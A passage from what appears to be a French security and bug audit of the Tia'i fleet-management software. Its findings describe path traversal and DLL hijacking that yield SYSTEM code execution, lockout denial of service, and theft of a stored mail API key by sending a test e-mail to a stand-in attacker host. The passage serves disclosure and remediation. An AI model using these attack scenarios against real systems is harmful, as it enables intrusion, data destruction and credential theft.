| [S31](#s31) | Faible | Image frontend sur nginx:1.27-alpine (branche en fin de vie) et jamais scannée par Trivy |
| [S32](#s32) | Faible | Backend et worker exécutés en root dans le conteneur, avec curl installé sans usage |
| [S33](#s33) | Faible | FIRST_ADMIN_PASSWORD n'a pas de longueur minimale et le compte admin initial échappe à PASSWORD_MIN_LENGTH |
| [S34](#s34) | Faible | index.html servi sans Cache-Control : console cassée après une mise à jour |
| [S35](#s35) | Info | Réveil direct : l'IP et le masque déclarés par l'agent choisissent la destination UDP du serveur, y compris 255.255.255.255 ou un hôte quelconque |
| [S36](#s36) | Info | Schéma OpenAPI complet exposé sans authentification via Caddy |
| [B01](#b01) | Moyenne | La carte « Disque presque plein » ouvre tout le parc dès que le seuil réglé n'est ni 10 ni 20 % |
| [B02](#b02) | Moyenne | Fiche poste et tableau de bord entièrement inaccessibles sans les droits threat:read ou command:read |
| [B03](#b03) | Moyenne | La fusion de postes perd first_seen et les réglages de maintenance de l'enregistrement supprimé |
| [B04](#b04) | Moyenne | Échecs de rechargement ignorés après le premier succès : la liste affiche d'anciennes lignes sous le nouveau filtre |
| [B05](#b05) | Moyenne | La sélection de postes survit aux changements de filtre et de page, et les actions groupées visent des postes masqués |
| [B06](#b06) | Moyenne | Supprimer une ligne « Maintenance » ou enregistrer une date future fausse durablement l'échéance du poste, sans moyen de correction |
| [B07](#b07) | Moyenne | Supprimer un bâtiment échoue en 500 dès qu'une salle de même nom existe déjà hors bâtiment |
| [B08](#b08) | Moyenne | Responsable par défaut supprimé ou désactivé : ses postes n'apparaissent plus dans aucun filtre « Les miennes » ou « À prendre » |
| [B09](#b09) | Moyenne | La séance de salle coche par défaut les postes exclus, et « Maintenances à faire » liste aussi les postes à jour |
| [B10](#b10) | Moyenne | Les commandes « Transmise » ou « En cours » ne sont jamais relivrées ni expirées : l'agent compte sur une relivraison que le serveur ne fait pas |
| [B11](#b11) | Moyenne | useAutoRefresh relance l'intervalle après le démontage si refreshNow() était en cours : polling qui fuit |
| [B12](#b12) | Moyenne | « Rafraîchir l'inventaire » n'apparaît dans aucun menu : le groupe 'inventory' manque à groupOrder |
| [B13](#b13) | Moyenne | Remplacer ou retirer un fichier d'un paquet casse les déploiements déjà remis (404 sur le téléchargement) |
| [B14](#b14) | Moyenne | La page d'un paquet n'affiche que les 50 derniers déploiements, sans pagination ni total ni agrégat |
| [B15](#b15) | Moyenne | Commandes perdues sans retour quand la file en mémoire de l'agent est pleine (16) |
| [B16](#b16) | Moyenne | Commandes en attente abandonnées à l'arrêt du service, sans résultat ni nouvelle remise |
| [B17](#b17) | Moyenne | Une intervention « Maintenance » saisie (ou supprimée) dans le journal ne met pas à jour le cycle du poste |
| [B18](#b18) | Faible | Les flèches poste précédent/suivant sautent ou répètent des postes avec le tri par défaut (dernier contact) |
| [B19](#b19) | Faible | Après une fusion, le journal des interventions de la fiche n'est pas rechargé |
| [B20](#b20) | Faible | Catalogue logiciel : recherche et page absentes de l'URL, et date « Vu depuis » affichée en UTC |
| [B21](#b21) | Faible | « Une seule vérification ouverte par poste » : en concurrence, erreur 500 à la création et double écriture au journal à la clôture |
| [B22](#b22) | Faible | Sortir une salle de son bâtiment efface silencieusement son emplacement et fait disparaître les signalements de divergence |
| [B23](#b23) | Faible | Session expirée : toasts « Identifiants invalides » trompeurs, un par requête en cours |
| [B24](#b24) | Faible | Longueur minimale du mot de passe et durée du lien de réinitialisation codées en dur dans le front alors qu'elles sont configurables |
| [B25](#b25) | Faible | Le journal d'audit ne sait ni nommer ni filtrer les actions sur les paquets, user.locked et machine.reenroll_requested |
| [B26](#b26) | Faible | Utilisateurs : supprimer le dernier compte d'une page laisse un tableau vide |
| [B27](#b27) | Faible | PATCH /users/{id} et /groups/{id} : un champ obligatoire envoyé à null provoque une 500 |
| [B28](#b28) | Faible | Ordre de remise des commandes non déterministe : « installer les MAJ puis redémarrer » peut s'exécuter à l'envers |
| [B29](#b29) | Faible | Réveil relayé capté par un agent incapable de l'exécuter : le réveil est perdu sans repli |
| [B30](#b30) | Faible | Le dialogue de déploiement permet d'envoyer un paquet qu'il déclare lui-même inexécutable |
| [B31](#b31) | Faible | Plafond Caddy (2 GB décimaux, par requête) plus strict que le backend (2 Gio, par fichier) : 413 inattendu au dépôt |
| [B32](#b32) | Faible | Échec transitoire de lecture de token.dat : réenrôlement bloqué en attente d'approbation, poste hors ligne alors que son jeton est valide |
| [B33](#b33) | Faible | Poste en attente d'approbation : chaque tentative d'enrôlement écrit une entrée d'audit (≈ 384/jour/poste) |
| [B34](#b34) | Faible | Type de commande inconnu ignoré sans résultat : commande « transmise » sans verdict sur un parc à versions mixtes |
| [B35](#b35) | Faible | Le choix du responsable de maintenance dépend de check:read |
| [B36](#b36) | Faible | Supprimer un fichier absent d'un paquet affiche « Paquet introuvable » |
| [U01](#u01) | Moyenne | Fiche poste : passer au poste précédent/suivant en échec laisse une page vide sans message d'erreur durable |
| [U02](#u02) | Moyenne | Groupes : un emplacement saisi sans appuyer sur Entrée est perdu en silence, et le groupe s'ouvre à tout le parc |
| [U03](#u03) | Moyenne | Le message d'erreur précis du backend est remplacé par un libellé générique (« Paquet invalide », « Requête invalide ») |
| [U04](#u04) | Moyenne | Désinstaller sur tout le parc en un clic : aucune confirmation, et le périmètre « Tout le parc » est conservé d'une ouverture à l'autre |
| [U05](#u05) | Moyenne | Fiche paquet : déposer un fichier, signer ou retirer le paquet efface les modifications non enregistrées de la définition |
| [U06](#u06) | Moyenne | Paramètres : les seuils numériques ne sont pas validés côté client, et un champ vidé devient 0 sans avertissement |
| [U07](#u07) | Faible | Tableau de bord : « Aucune menace active. » s'affiche pendant le chargement et quand l'API est en panne |
| [U08](#u08) | Faible | Filtre « logiciel » anonyme, et invisible quand le panneau de filtres est ouvert |
| [U09](#u09) | Faible | Page Logiciels : « Aucun logiciel inventorié pour l'instant » s'affiche pour une recherche sans résultat ou après une erreur |
| [U10](#u10) | Faible | Le routeur remonte toujours en haut de page, même au retour arrière |
| [U11](#u11) | Faible | Dialogue de fusion : min-width 560px déborde sur mobile |
| [U12](#u12) | Faible | Révocation du token : bouton de confirmation générique « OK », sans couleur d'alerte |
| [U13](#u13) | Faible | Réinitialisation de mot de passe : le mot de passe affiché une seule fois disparaît sur un clic hors du dialogue ou sur Échap |
| [U14](#u14) | Faible | Saisie de maintenance : les notes par poste sont perdues si le dialogue se ferme par Échap ou par un clic à côté |
| [U15](#u15) | Faible | Formulaires de création de compte et de réinitialisation : pas d'attribut autocomplete, le gestionnaire de mots de passe confond avec le compte de l'admin |
| [U16](#u16) | Faible | Dépôt de fichiers d'un paquet : pas d'annulation, pas de contrôle de taille avant l'envoi, et un refus de Caddy n'affiche qu'un message générique |
| [U17](#u17) | Faible | Explication incompréhensible sous le réglage « Vérifier le certificat du serveur » |
| [U18](#u18) | Faible | Pas de moyen de prendre en charge une maintenance « À prendre » depuis Mes tâches |
| [U19](#u19) | Faible | Le badge « Mes tâches » ne compte que les vérifications et n'est pas mis à jour après une clôture |
| [U20](#u20) | Faible | Impossible de noter pourquoi un poste n'a pas été fait : le champ d'observation est désactivé quand le poste est décoché |
| [U21](#u21) | Faible | Cases à cocher du dialogue de séance sans libellé accessible |
| [U22](#u22) | Faible | Échéances peu lisibles : date passée affichée comme « prochaine échéance », à la seconde, sans durée de retard |
| [U23](#u23) | Faible | Sur téléphone, le bouton « Clore » des vérifications est hors écran dans un tableau à défilement horizontal |
| [U24](#u24) | Faible | Salle de plus de 200 postes : liste et séance de maintenance tronquées sans avertissement |
| [U25](#u25) | Faible | Liste des postes : la mise en page par défaut fait plus de 2 200 px de large, et les colonnes de supervision (Antivirus, MAJ Windows, Session, Vu le) sont hors écran en 1440 px |
| [U26](#u26) | Faible | « Mes tâches » : dès que le libellé de lieu est long, la colonne Consignes est écrasée à 116 px et le bouton « Clore » est coupé en 1440 px |
| [U27](#u27) | Faible | Paramètres › Réglages du serveur : en mobile, les clés en `nowrap` réduisent la description à une colonne étroite et tronquée |
| [U28](#u28) | Faible | Badge antivirus vert alors que le libellé dit « Non relevé » (ou « Aucun ») |
| [U29](#u29) | Faible | En mobile, le titre « Tia'i — Console » est tronqué en « Tia'i … » par l'adresse e-mail affichée en permanence |
| [U30](#u30) | Info | Fiche poste : boutons d'en-tête incohérents, « Logiciel » en casse normale et les autres en majuscules |

### 7.1 Sécurité

<a id="s01"></a>

#### S01 — Agent : l'identifiant de paquet envoyé par le serveur sert de chemin sans validation (traversée de répertoire, écriture et suppression récursive en SYSTEM)

**Sévérité :** Élevée · **Statut :** vérifié + contre-expertise confirmée · **Emplacement :** `agent/internal/deploy/executor.go:140`

`pkg.ID` vient du JSON de la commande (models.PackageDelivery.ID, une chaîne libre) et sert directement à construire le répertoire de travail. Rien ne vérifie que c'est un UUID. En méthode A, le manifeste n'est pas signé : ParseManifest se contente de vérifier `m.PackageID == packageID`, deux valeurs fournies par le serveur. Un serveur compromis peut donc choisir un chemin comme `..\..\..\Windows\System32`. L'agent fait alors MkdirAll puis télécharge chaque fichier du manifeste dans ce répertoire (ligne 148), et cela AVANT tout contrôle Authenticode. Ensuite, si le code de sortie figure dans `success_codes` (lui aussi non signé en méthode A), il exécute `os.RemoveAll(dir)` (ligne 184) sur ce répertoire arbitraire. Cela dépasse nettement le risque résiduel documenté pour la méthode A (« lancer un installateur légitime de cet éditeur avec des arguments de son choix »).

```
dir := filepath.Join(env.PackagesDir(), pkg.ID)
if err := os.MkdirAll(dir, 0o700); err != nil {
...
for _, f := range manifest.Files {
	if err := env.Download(ctx, pkg.ID, f, filepath.Join(dir, f.Name)); err != nil {
...
// The files have done their job; a failed run keeps them for a retry.
_ = os.RemoveAll(dir)
```

**Scénario.** Prérequis : le serveur est compromis et au moins un poste a une valeur DeployPublishers posée par GPO (méthode A active). Le serveur envoie une commande package_install avec `package.id = "..\\..\\..\\Windows\\System32"`, un manifeste non signé portant le même package_id, un fichier `wbemcomn.dll` (ou tout autre DLL chargée par un service SYSTEM) et, comme exécutable, l'installateur légitime d'un éditeur approuvé déjà présent dans le catalogue. La DLL est écrite dans System32 en SYSTEM avant même la vérification Authenticode, ce qui donne une exécution de code en SYSTEM au prochain chargement. Variante : `package.id = "..\\..\\..\\Users"` et `success_codes = [0,1,2,...]`. L'installateur approuvé tourne, puis `os.RemoveAll("C:\\Users")` s'exécute en SYSTEM, d'où une perte de données sur tout le parc ciblé.

**Recommandation.** Côté agent, refuser tout `pkg.ID` qui n'est pas un UUID canonique (regex `^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$`) avant tout usage, dans Execute ou ParseManifest. Ajouter une défense en profondeur : vérifier que `filepath.Rel(PackagesDir, dir)` ne commence pas par `..`, et ne lancer RemoveAll que sur un répertoire situé sous PackagesDir. Ajouter un test unitaire avec un ID contenant `..`.

<a id="s02"></a>

#### S02 — Méthode A : des fichiers non signés (DLL) sont déposés à côté de l'exécutable signé, ce qui permet un chargement de DLL détourné et l'exécution de code arbitraire en SYSTEM

**Sévérité :** Élevée · **Statut :** vérifié + contre-expertise confirmée · **Emplacement :** `agent/internal/deploy/executor.go:147`

En méthode A, seul l'exécutable lancé passe par WinVerifyTrust. Tous les autres fichiers du manifeste (non signé, donc choisis par le serveur) sont téléchargés dans le même répertoire, puis l'exécutable est lancé avec ce répertoire comme répertoire courant (ligne 175 : `env.Run(ctx, exe, ..., dir)`). Le commentaire du code suppose que ces fichiers sont « des données que l'installateur lit ». Or l'ordre de recherche des DLL de Windows regarde d'abord le répertoire de l'application pour toute DLL qui n'est pas une KnownDLL (version.dll, winhttp.dll, dbghelp.dll, cryptbase.dll…). Un installateur signé d'un éditeur approuvé charge donc la DLL déposée par le serveur. De plus, le répertoire n'est vidé qu'en cas de succès (ligne 184). Une tentative en méthode A qui échoue, par exemple sur un exécutable refusé par Authenticode après le téléchargement, laisse donc la DLL sur place. Un paquet ultérieur du même ID, même signé en méthode B, sera ensuite lancé dans ce répertoire contaminé.

```
// What gets downloaded is what the manifest names — by hash. Under method
// A an unsigned manifest names them too, but the file that runs is then
// checked by Windows, and the others are data it reads.
for _, f := range manifest.Files {
...
code, err := env.Run(ctx, exe, ExpandArgs(step.Args, dir), dir)
```

**Scénario.** Prérequis : le serveur est compromis, ou un utilisateur détient package:write, command:execute et risky_command:execute, et la GPO approuve « INDEX EDUCATION SAS ». On crée un paquet `files` avec l'installateur Pronote authentique, signé et validé par WinVerifyTrust, plus un fichier `version.dll` malveillant. Le paquet est déployé : l'installateur, lancé en SYSTEM depuis C:\ProgramData\Tiai\packages\<id>, charge `version.dll` depuis son propre répertoire. Résultat : du code arbitraire s'exécute en SYSTEM sur tous les postes ciblés, ce que la méthode A est censée empêcher.

**Recommandation.** En méthode A, ne télécharger que le fichier lancé (refuser tout manifeste non signé qui contient d'autres fichiers), ou au minimum refuser les extensions chargeables (.dll, .ocx, .cpl, .sys, .manifest, .local, .config). Purger le répertoire du paquet (os.RemoveAll) avant chaque exécution, pas seulement après un succès. Envisager de lancer l'exécutable depuis un répertoire qui ne contient que lui. Mettre à jour la documentation du risque résiduel de la méthode A.

<a id="s03"></a>

#### S03 — Verrouillage de compte déclenchable à volonté : déni de service permanent sur n'importe quel compte, administrateur compris

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `backend/app/features/user/crud.py:105`

Le verrouillage par compte se déclenche après LOGIN_MAX_FAILED_ATTEMPTS (5) échecs, sans authentification préalable. Pendant le verrouillage, même le bon mot de passe est refusé, car le test locked_until passe avant la vérification du mot de passe. Le compteur ne décroît jamais avec le temps ; seul un succès le remet à zéro. Le budget par IP (10 tentatives / 300 s, ratelimit.py:68) dépasse largement ce qu'il faut pour reverrouiller un compte toutes les 15 minutes (LOGIN_LOCKOUT_MINUTES). Dès qu'une adresse de console est connue (par exemple admin@natimai.local), n'importe quel poste du LAN peut garder le compte fermé indéfiniment, et le reset par lien ou par administrateur est annulé dès le cycle suivant.

```
if user.locked_until is not None and user.locked_until > now:
        raise AccountLockedError(user, user.locked_until, just_locked=False)
    if not security.verify_password(password, user.hashed_password):
        user.failed_login_attempts += 1
        ...
        if user.failed_login_attempts >= settings.LOGIN_MAX_FAILED_ATTEMPTS:
            user.failed_login_attempts = 0
            user.locked_until = now + timedelta(minutes=settings.LOGIN_LOCKOUT_MINUTES)
```

**Scénario.** Un élève sur un poste de salle lance une boucle qui envoie 5 POST /api/v1/auth/login {username: admin@natimai.local, password: x} toutes les 15 minutes. Cela fait 5 requêtes par fenêtre, sous la limite de 10 par IP. L'administrateur obtient un 423 en permanence, même avec son bon mot de passe. S'il est le seul administrateur, plus personne ne peut gérer la console, et même un reset réussi est reverrouillé au cycle suivant.

**Recommandation.** Ne pas bloquer une connexion avec le bon mot de passe pendant le verrouillage : par exemple, vérifier le mot de passe avant tout et ne refuser que les échecs, ou appliquer un délai progressif plutôt qu'un blocage dur. Une autre option est de verrouiller le couple (compte, IP) plutôt que le compte seul. Il faut aussi faire décroître le compteur avec le temps, par exemple en remettant à zéro après une fenêtre sans échec.

<a id="s04"></a>

#### S04 — POST /auth/password sans limitation : brute-force du mot de passe actuel et blocage de toute l'API par bcrypt synchrone

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `backend/app/api/routes/auth.py:515`

Le changement de mot de passe vérifie current_password avec bcrypt. Pourtant (1) aucune dépendance rate_limit n'est posée sur la route, et (2) un échec n'incrémente pas failed_login_attempts, contrairement au login. Avec un jeton d'accès volé (XSS, poste resté ouvert), on peut donc deviner le mot de passe sans limite et sans déclencher de verrouillage. On obtient ainsi l'identifiant réel, qui survit à la révocation des sessions et sert souvent ailleurs. De plus, bcrypt.checkpw (coût 12, environ 250 ms) est appelé de façon synchrone dans une route async. L'API tourne en un seul processus uvicorn (entrypoint.sh : `exec uvicorn app.main:app` sans --workers), donc chaque requête bloque toute la boucle d'événements : console, heartbeats et enrôlement des agents.

```
@router.post("/password", status_code=204)
async def change_password(
    payload: PasswordChange, user: CurrentUser, session: SessionDep
) -> None:
    ...
    if not security.verify_password(payload.current_password, user.hashed_password):
        raise AppError(code=ErrorCode.PASSWORD_CURRENT_INVALID, status_code=400, ...)
```

**Scénario.** Un opérateur en lecture seule, ou quiconque détient un jeton d'accès valide pendant 15 min et le renouvelle par refresh, envoie des POST /api/v1/auth/password {current_password: <candidat>, new_password: ...} en parallèle. (a) Il teste un dictionnaire sans jamais être verrouillé. (b) À environ 4 requêtes par seconde, la boucle d'événements est occupée en permanence par bcrypt : toutes les autres requêtes de l'API (heartbeats des postes, console des autres opérateurs) partent en timeout.

**Recommandation.** Appliquer un RateLimiter dédié à /auth/password, indexé par utilisateur et non seulement par IP. Compter les échecs de current_password dans failed_login_attempts, ou révoquer la session après N échecs. Enfin, exécuter bcrypt hors de la boucle (await asyncio.to_thread(...)) dans verify_password, get_password_hash et burn_password_check, appelés depuis login, password, reset et users.

<a id="s05"></a>

#### S05 — Escalade de périmètre par la modification d'un groupe : un gestionnaire limité à un site accorde des droits sur tout le parc

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `backend/app/api/routes/groups.py:281`

PATCH /groups/{id} vérifie seulement que le groupe lui-même (ses permissions et son périmètre) reste dans l'autorité de l'appelant. Il ne regarde jamais les membres du groupe. Or le périmètre d'un compte est l'union de ceux de ses groupes, et un seul groupe non restreint suffit à donner tout le parc (scope.union renvoie None). Un compte limité au site A qui détient user:write peut donc ajouter une permission à un groupe restreint au site A dont un membre appartient aussi à un groupe non restreint. Ce membre reçoit alors la permission sur tout le parc. La route /users bloque ce cas, car elle compare l'autorité du compte visé (wider_scope). La route /groups le laisse passer.

```
reject_escalation(
        authority,
        await crud.groups_authority(session, [group.id]),
        actor_email=current.email,
        action="edit",
    )
...
                scope=scope if scope_changed else current_scope,
```

**Scénario.** A est limité au site Taravao et a user:read, user:write, machine:read et command:execute. Le groupe G « Tech Taravao » (site Taravao, machine:read) compte M parmi ses membres, et M est aussi dans le groupe intégré « Lecture seule », non restreint. A envoie PATCH /groups/G {"permissions":["machine:read","command:execute"]}. Les deux contrôles passent, car les permissions sont incluses dans celles de A et le périmètre est Taravao. M peut désormais lancer des commandes (analyses, mise à jour GPO, vidage DNS, réveil réseau…) sur tout le parc, alors que A n'aurait jamais pu modifier M directement : PATCH /users/M est refusé avec wider_scope=true.

**Recommandation.** Quand un appelant non administrateur modifie les permissions d'un groupe, vérifier aussi l'autorité de chaque membre (crud.user_authority) avec reject_escalation, comme le fait PATCH /users. Une alternative plus simple : réserver aux comptes non restreints la modification des permissions d'un groupe qui a des membres. Ajouter un test dans test_api_scope.py.

<a id="s06"></a>

#### S06 — Le détail d'une session de maintenance liste les postes hors périmètre

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `backend/app/api/routes/maintenance.py:594` · aussi : 

GET /maintenance/{id} vérifie qu'une salle ou un poste de la session est dans le périmètre (_visit_clause). Il appelle ensuite _session_out sans passer le périmètre. session_items reçoit donc where=None et renvoie toutes les interventions de la session, avec nom d'hôte, identifiant et note de chaque poste, y compris ceux des autres sites. record_session (ligne 531) passe pourtant scope=scope.

```
return await _session_out(session, visit, with_items=True)
```

**Scénario.** Un administrateur enregistre une tournée sans salle sur deux postes : TAR-PC01 (Taravao) et PPT-PC07 (Papeete). Un technicien limité à Taravao ouvre GET /api/v1/maintenance/{id}. La session est visible grâce à TAR-PC01, et la réponse contient aussi l'élément PPT-PC07 avec son identifiant et la note saisie, alors que ce poste répond 404 sur /machines/{id}.

**Recommandation.** Passer le périmètre : `return await _session_out(session, visit, with_items=True, scope=scope)`. Ajouter un test qui couvre une session à cheval sur deux sites.

*Signalé aussi sous un autre angle :* Détail d'une séance de maintenance : la liste des postes n'est pas filtrée par le périmètre de l'utilisateur ; La fiche d'une séance de maintenance expose les postes hors du périmètre du compte

<a id="s07"></a>

#### S07 — Heartbeat en erreur 500 permanente en mode ROOM_SOURCE=ad_location dès que l'attribut AD « location » dépasse 100 caractères

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `backend/app/features/room/crud.py:287`

Le schéma d'inventaire accepte `ad_location` jusqu'à TEXT_MAX=200 caractères (inventory/schemas.py l.24 et l.326). En mode ad_location, `directory_key` utilise cette valeur telle quelle comme nom de salle, et `room_for_key` crée `Room(name=candidate)`. Or `rooms.name` est un VARCHAR(100) (models.py l.68, migration 0017), et un modèle SQLModel table=True ne valide pas la longueur à la construction. Le flush échoue (StringDataRightTruncation) au milieu du heartbeat : la requête entière renvoie 500, Defender, menaces et retrait des commandes compris. Le même dépassement survient avec le suffixe « (n) » sur un nom de 97 à 100 caractères.

```
if source == "ad_location":
        if machine.ad_location:
            return machine.ad_location, machine.ad_location
...
    room = Room(name=candidate, ad_key=key)
    session.add(room)
    await session.flush()
```

**Scénario.** ROOM_SOURCE=ad_location. Dans AD, l'objet ordinateur porte location="Bâtiment administratif Nord — 2e étage — aile Est — Salle de réunion du conseil pédagogique et des professeurs principaux 214" (125 caractères ; AD accepte 1024). L'agent joint l'inventaire, le heartbeat renvoie 500, et l'agent garde le bloc en attente puis le renvoie à chaque tick (heavyHeartbeatTimeout, cache non acquitté). Le poste paraît hors ligne indéfiniment et ne reçoit plus aucune commande. De plus, si la valeur a été enregistrée avant le passage en ad_location (sous manual ou ad_ou, où elle ne sert pas de nom de salle), POST /rooms/sync-directory (sync_from_directory) échoue pour tout le parc à cause de ce seul poste.

**Recommandation.** Tronquer le nom de la salle à 100 caractères en tenant compte du suffixe (par exemple name[:100-len(suffix)]) dans room_for_key. Aligner TEXT_MAX de `ad_location` et de `ou` sur la colonne, ou séparer la clé (500) du nom affiché. Encapsuler place_from_directory dans un savepoint (session.begin_nested) pour qu'un échec de placement ne fasse jamais échouer le heartbeat. Ajouter un test avec une valeur de 101 à 200 caractères.

<a id="s08"></a>

#### S08 — Le contenu du paquet est lu à la livraison, pas à la mise en file : un détenteur de package:write modifie un déploiement déjà approuvé par un autre

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `backend/app/api/routes/agent.py:408`

La commande ne mémorise que `package_id` (commands.py l. 278-285). Le paquet, avec ses fichiers, arguments, winget_id et statut retiré, est relu au moment où le poste récupère la commande (`_package_deliveries`), ce qui peut arriver jusqu'à 30 jours plus tard (TTL max). Ni la mise à jour (PATCH /packages/{id}, upload, suppression de fichier) ni le retrait ne tiennent compte des commandes en attente, et la livraison ne vérifie ni `retired_at` ni les `problems`. Le module affirme pourtant que déployer exige risky_command:execute, une permission distincte de package:write (le groupe Techniciens par défaut a risky_command sans package:write). Le catalogue de paquets est aussi global : il ne respecte pas la portée (scope) de l'utilisateur.

```
async def _package_deliveries(
    session: SessionDep, package_ids: set[uuid.UUID]
) -> dict[uuid.UUID, PackageDelivery]:
    ...
    packages = (
        await session.exec(select(Package).where(col(Package.id).in_(package_ids)))
    ).all()
```

**Scénario.** Un technicien d'un site (risky_command:execute) lance l'installation du paquet winget « Mozilla.Firefox » sur 300 postes, dont beaucoup sont éteints (TTL de 7 jours). Un utilisateur d'un autre site, limité au catalogue (package:write sans risky_command), fait un PATCH qui remplace `winget_id` par un autre identifiant. Pour un paquet `files` en méthode A, il remplace plutôt `install_args` ou ajoute des fichiers. Chaque poste qui se rallume reçoit la version modifiée et l'exécute en SYSTEM, hors de la portée de cet utilisateur et sans qu'il ait jamais eu le droit de déployer. Le même mécanisme fait aussi installer un paquet retiré après sa mise en file.

**Recommandation.** Figer ce qui a été approuvé au moment de la mise en file. Soit stocker sur la commande un instantané (manifest, signature, winget_id/version, empreinte), soit enregistrer `package.updated_at` ou un hash et refuser à la livraison (passage en FAILED) toute commande dont le paquet a changé ou a été retiré. À défaut, refuser les modifications d'un paquet qui a des commandes PENDING ou DELIVERED.

<a id="s09"></a>

#### S09 — Fichiers de paquets jamais supprimés : remplacement, échec partiel d'un dépôt multi-fichiers et absence de suppression de paquet saturent le disque (partagé avec PostgreSQL)

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `backend/app/api/routes/packages.py:383` · aussi : 

Quand un fichier est remplacé par un autre de même nom, seule la ligne en base est supprimée. L'ancien blob stocké sous son SHA-256 reste sur le volume, sans aucun appel à `sha_in_use` ni à `remove_unreferenced` (que seule la route DELETE file utilise). De plus, `storage.save` écrit chaque fichier dans le store définitif avant le commit. Si un fichier suivant du même lot est refusé (nom invalide, 413), la transaction est annulée mais les fichiers précédents restent orphelins. Il n'existe pas non plus de route de suppression de paquet, ni de ramasse-miettes. Caddy autorise 2 Go par requête, et les volumes nommés `packages` et `db_data` sont sur le même disque hôte (pilote local).

```
existing = await session.get(PackageFile, (package.id, name))
if existing is not None:
    await session.delete(existing)
    await session.flush()
session.add(
    PackageFile(
```

**Scénario.** Un utilisateur package:write (ou l'usage normal : redéposer chaque nouvelle version de LibreOffice de 350 Mo sous le même nom) envoie à répétition un fichier `setup.exe` de 2 Go au contenu chaque fois différent. Chaque envoi laisse un blob de 2 Go non référencé dans /data/packages. Autre cas : un envoi de 3 fichiers dont le dernier a un nom refusé laisse les deux premiers orphelins. Après quelques dizaines d'envois, le disque est plein, PostgreSQL ne peut plus écrire et toute l'API tombe (heartbeats, audit).

**Recommandation.** Au remplacement, mémoriser l'ancien sha256 et appeler `remove_unreferenced` après le commit si `sha_in_use` renvoie faux, comme le fait delete_file. En cas d'exception pendant upload_files, supprimer les blobs écrits par cette requête et qui ne sont pas référencés. Ajouter une tâche de nettoyage qui supprime les fichiers du store absents de package_files. Envisager un quota global ou un volume séparé de celui de la base.

*Signalé aussi sous un autre angle :* Fichiers de paquet orphelins sur disque (jusqu'à 2 Gio chacun) au remplacement d'un fichier ou après un dépôt multiple échoué

<a id="s10"></a>

#### S10 — Exfiltration du mot de passe SMTP ou de la clé API Mailgun stockés, via l'« e-mail de test » ou un PATCH qui ne change que l'hôte ou l'URL

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `backend/app/api/routes/settings_routes.py:557` · aussi : `backend/app/api/routes/settings_routes.py:559`

Le code et la documentation de la page garantissent que les deux secrets ne sont jamais renvoyés (EmailSettingsOut ne donne que *_set). Pourtant, l'envoi de test fusionne les valeurs non enregistrées du formulaire avec les secrets déjà stockés, ou ceux de l'environnement, via StoredEmailSettings.merged et resolve. Un détenteur de settings:write peut donc pointer smtp_host ou mailgun_base_url vers un serveur qu'il contrôle : le serveur envoie alors le secret qu'on ne lui montre jamais. Côté Mailgun, il part en Basic Auth « api:<clé> ». Côté SMTP, il part via AUTH PLAIN, avec smtp_security=none. Le même mécanisme sert d'outil de SSRF ou de scan de ports interne. describe_error distingue « connexion refusée », « délai dépassé » et « TLS », et renvoie jusqu'à 200 caractères du corps de réponse HTTP (probe.py, ligne 100). La même chose arrive à chaque envoi après un PATCH qui ne change que l'hôte, puisque le secret stocké est conservé. Le droit settings:write peut être accordé à des groupes autres qu'administrateur (permissions.py, lignes 82-83).

```
stored = await mail.load_stored(session)
    unsaved = payload.email.changes() if payload.email is not None else {}
    policy = mail.resolve(stored.merged(unsaved))
...
# mailgun.py
    url = f"{policy.mailgun_base_url.rstrip('/')}/{policy.mailgun_domain}/messages"
    resp = await client.post(url, auth=("api", policy.mailgun_api_key or ""), ...)
```

**Scénario.** Un opérateur d'un groupe personnalisé détient settings:write mais n'a jamais connu la clé Mailgun, saisie par l'administrateur ou mise dans le .env. Il envoie POST /settings/email/test avec {"email": {"provider": "mailgun", "mailgun_base_url": "https://collecteur.attaquant.example"}}. Le serveur poste vers https://collecteur.attaquant.example/<domaine>/messages avec l'en-tête Authorization: Basic base64(api:<clé>), et l'attaquant récupère la clé. De même, avec {"smtp_host": "attaquant.example", "smtp_security": "none", "smtp_port": 25}, le mot de passe SMTP part en clair.

**Recommandation.** Quand smtp_host, smtp_port ou smtp_security changent (formulaire de test ou PATCH), ne réutiliser le mot de passe stocké ou de l'environnement que si un nouveau mot de passe est fourni dans la même requête. Faire de même pour mailgun_base_url et mailgun_domain avec la clé API. Sinon, refuser avec une erreur 422 « ressaisir le secret ». Ne pas renvoyer le corps des réponses HTTP tierces dans le message du probe.

*Signalé aussi sous un autre angle :* Un compte paramètres:écriture peut exfiltrer la clé API Mailgun ou le mot de passe SMTP via le test d'envoi

<a id="s11"></a>

#### S11 — Export Excel (parc et logiciels) cassé en 500 par un caractère de contrôle venu d'un agent

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `backend/app/api/xlsx_export.py:64`

openpyxl refuse les caractères de contrôle XML \x00-\x08, \x0b, \x0c et \x0e-\x1f : il lève IllegalCharacterError à l'affectation de la cellule. Or les chaînes envoyées par l'agent ne sont que tronquées, jamais filtrées. C'est le cas de bound_text dans agent.py (hostname, domain, session username, os_version) et de _bounded dans inventory/schemas.py (noms, éditeurs et versions des logiciels). Une seule valeur contenant un tel caractère fait échouer toute l'exportation XLSX du parc ou du catalogue, pour tous les utilisateurs du périmètre. L'export CSV, lui, passe. Vérifié : xlsx_response('a.xlsx', ['a'], [['abc\x01def']]) lève openpyxl.utils.exceptions.IllegalCharacterError.

```
for row in rows:
        values = ["" if v is None else v for v in row]
        sheet.append(values)
...
# agent.py
def bound_text(value: str | None, limit: int = TEXT_MAX) -> str | None:
    if value is None:
        return None
    return value[:limit]
```

**Scénario.** Un poste (agent compromis ou bogué, ou une clé de registre Uninstall dont le DisplayName contient \u0001) envoie dans son heartbeat "hostname": "PC-12\u0001" ou un logiciel nommé "Outil\u0001". GET /machines/export.xlsx et GET /software/export.xlsx répondent alors 500 pour tout export qui inclut cette ligne (et, pour le parc, la colonne fautive), tant qu'elle existe, sans indiquer quelle donnée est fautive.

